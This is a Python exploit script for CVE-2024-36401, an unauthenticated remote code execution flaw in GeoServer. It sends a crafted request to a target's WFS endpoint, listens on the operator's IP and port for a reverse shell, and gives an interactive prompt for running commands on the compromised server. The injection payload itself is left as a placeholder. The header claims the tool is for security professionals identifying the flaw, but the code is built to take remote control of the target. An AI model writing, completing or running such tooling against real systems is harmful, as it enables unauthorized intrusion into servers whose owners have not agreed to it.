# GeoServer is an open source server that allows users to share and edit geospatial data. Prior to versions 2.23.6, 2.24.4, and 2.25.2, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.
# Exploit example usage "python CVE-2024-36401.py -u http://127.0.0.1:8000 -ip 192.168.0.133 -port 3090 -type GeoServer-Object-Type"
# Siberpen.com Cyber Security Solutions (Siberpen.com is not the original author of this vulnerability)
# This exploit code was created for cyber security professionals to identify the CVE-2024-36401 GeoServer vulnerability.


from urllib.parse import urlparse
import requests
import argparse
import re
import os
import threading
import time
import socket
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

LOG_DIR = "logs"

if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

def print_message(level, message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
    print(f"{current_time} [{level.upper()}] {message}")

def target_host(url):
    parsed_url = urlparse(url)
    host = parsed_url.netloc or parsed_url.path
    host = re.sub(r'^www\.', '', host).rstrip('/')
    return host

def exploit_request(url, host, ip, port, type):
    full_url = f"{url}/geoserver/wfs"
    headers = {
        "Host": host,
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "*/*",
        "Accept-Language": "en-US;q=0.9,en;q=0.8",
        "User-Agent": "Mozilla/5.0",
        "Connection": "close",
        "Cache-Control": "max-age=0",
        "Content-Type": "application/xml",
    }
    custom_payload = "Payload Here"
    
    try:
        response = requests.post(full_url, headers=headers, data=custom_payload, timeout=30, verify=False)
        print_message('info', f"Response status code: {response.status_code}")
        if response.status_code in [401, 404, 403]:
            print_message('info', "Target is not vulnerable.")
        else:
            print_message('info', "Request sent. Checking for incoming connections.")
    except requests.exceptions.RequestException as e:
        print_message('error', f"An error occurred: {e}")

def interactive_shell(client_socket):
    print_message('warning', "Shell established.")
    while True:
        command = input("shell> ")
        if command.lower() == 'exit':
            break
        client_socket.send(command.encode() + b'\n')
        time.sleep(1)
        output = return_output(client_socket)
        if output:
            print(output)
        else:
            print_message('warning', "No output received.")

def return_output(client_socket, timeout=5):
    total_data = []
    client_socket.setblocking(0)
    start_time = time.time()
    while True:
        if total_data and time.time() - start_time > timeout:
            break
        elif time.time() - start_time > timeout * 2:
            break
        try:
            data = client_socket.recv(8192)
            if data:
                total_data.append(data.decode('utf-8', errors='ignore'))
                start_time = time.time()
            else:
                time.sleep(0.1)
        except socket.error:
            pass
    return ''.join(total_data).strip()

def listen(ip, port, stop_event):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(1)
        print_message('info', f"Listening on {ip}:{port}...")
        try:
            while not stop_event.is_set():
                client, addr = s.accept()
                with client:
                    print_message('info', f"Received connection from: {addr}")
                    interactive_shell(client)
        except Exception as e:
            print_message('error', f"An error occurred: {e}")

def main():
    parser = argparse.ArgumentParser(description='Exploit for CVE-2024-36401')
    parser.add_argument('-u', required=True, help='Target URL')
    parser.add_argument('-ip', required=True, help='Your IP')
    parser.add_argument('-port', required=True, help='Port')
    parser.add_argument('-type', required=True, help='Type')
    args = parser.parse_args()

    host = target_host(args.u)
    stop_event = threading.Event()
    listen_thread = threading.Thread(target=listen, args=(args.ip, int(args.port), stop_event), daemon=True)
    listen_thread.start()

    exploit_request(args.u, host, args.ip, int(args.port), args.type)

    try:
        while listen_thread.is_alive():
            listen_thread.join(1)
    except KeyboardInterrupt:
        print_message('info', "Keyboard interrupt received. Cleaning up...")
    finally:
        stop_event.set()
        listen_thread.join()

if __name__ == "__main__":
    main()
